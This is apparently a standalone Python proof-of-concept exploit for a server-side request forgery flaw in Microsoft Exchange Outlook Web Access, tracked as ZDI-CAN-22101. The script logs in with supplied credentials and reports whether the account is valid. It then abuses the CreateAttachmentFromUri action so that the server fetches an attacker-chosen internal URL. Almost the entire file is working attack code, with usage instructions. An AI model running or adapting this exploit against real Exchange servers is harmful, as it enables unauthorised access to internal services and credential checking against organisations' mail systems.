# @Time    : 2023/11/14
# @Author  : jeyiuwai
# @File    : ZDI-CAN-22101.py

import requests
import sys
import warnings

session = requests.Session()
warnings.filterwarnings("ignore")

# not success
# def ssrf(url, username, password):
#     # owa
#     url1 = 'https://' + url + '/owa/auth.owa'
#     headers = {
#         "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
#     }
#
#     payload = 'destination=https://%s/owa&flags=4&forcedownlevel=0&username=%s&password=%s&passwordText=&isUtf8=1' % (
#     url, username, password)
#
#     r = session.post(url1, headers=headers, data=payload, verify=False)
#     if 'X-OWA-CANARY' in r.cookies:
#         print(r.headers)
#         print("[+] Valid:%s  %s" % (username, password))
#     else:
#         print("[!] Login error")
#     r.close()
#
#     # ssrf
#     url2 = 'https://' + url + '/owa/service.svc?action=CreateAttachmentFromUri'
#
#     headers2 = {
#         'X-OWA-CANARY': r.cookies['X-OWA-CANARY'],
#         "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
#         "X-Requested-With": "XMLHttpRequest",
#         'Action': 'CreateAttachmentFromUri'
#     }
#
#     internal_url = "http://127.0.0.1:8080/"
#
#     payload2 = '{"__type": "CreateAttachmentFromUriRequestWrapper:#Exchange", "isInline": "false", "itemId": {"__type": "ItemId:#Exchange", "ChangeKey": "poc", "Id": "poc"}, "name": "pocname.txt", "subscriptionId": "1", "uri": "%s"}' % (
#         internal_url)
#
#     try:
#         response2 = session.post(url2, headers=headers2, json=payload2, verify=False)
#         print(response2.status_code)
#         print(response2.text)
#     except Exception as e:
#         print(e)

def ssrf2(url, username, password,internal_url):
    # owa
    url1 = 'https://' + url + '/owa/auth.owa'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    }

    payload = 'destination=https://%s/owa&flags=4&forcedownlevel=0&username=%s&password=%s&passwordText=&isUtf8=1' % (
    url, username, password)

    r = session.post(url1, headers=headers, data=payload, verify=False)
    if 'X-OWA-CANARY' in r.cookies:
        # print(r.headers)
        print("[+] Account Valid:%s  %s" % (username, password))
    else:
        print("[!] Login error")
    r.close()

    # ssrf
    url2 = 'https://' + url + '/owa/service.svc?action=CreateAttachmentFromUri'

    headers2 = {
        'X-OWA-CANARY': r.cookies['X-OWA-CANARY'],
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        'Action': 'CreateAttachmentFromUri',
        "X-Owa-Urlpostdata": '{"__type": "CreateAttachmentFromUriRequestWrapper:#Exchange", "isInline": "false", "itemId": {"__type": "ItemId:#Exchange", "ChangeKey": "poc", "Id": "poc"}, "name": "pocname.txt", "subscriptionId": "1", "uri": "%s"}' % (internal_url)
    }

    # print(headers2)

    payload2 = ''

    try:
        print('[+] Start to exploit')
        response2 = session.post(url2, headers=headers2, json=payload2, verify=False)
        print('[+] Exploit end')
        # 无响应回显
        # print(response2.status_code)
        # print('Response text is:' + response2.text)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    if len(sys.argv) != 5:
        print('[!] Wrong parameter')
        print('SSRF ZDI-CAN-22101')
        print('Use to check the valid account of Exchange by connecting to OWA.And exploit the SSRF vulnerability to get internal url.')
        print('Author:jeyiuwai')
        print('Usage:')
        print('%s <url> <user> <password> <internal_url>' % (sys.argv[0]))
        print('Eg.')
        print('%s 192.168.1.1 user1 password1 http://127.0.0.1:8080' % (sys.argv[0]))
        sys.exit(0)
    else:
        # print(sys.argv[1] +'\n' + sys.argv[2] + '\n' + sys.argv[3] + '\n' + sys.argv[4])
        ssrf2(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
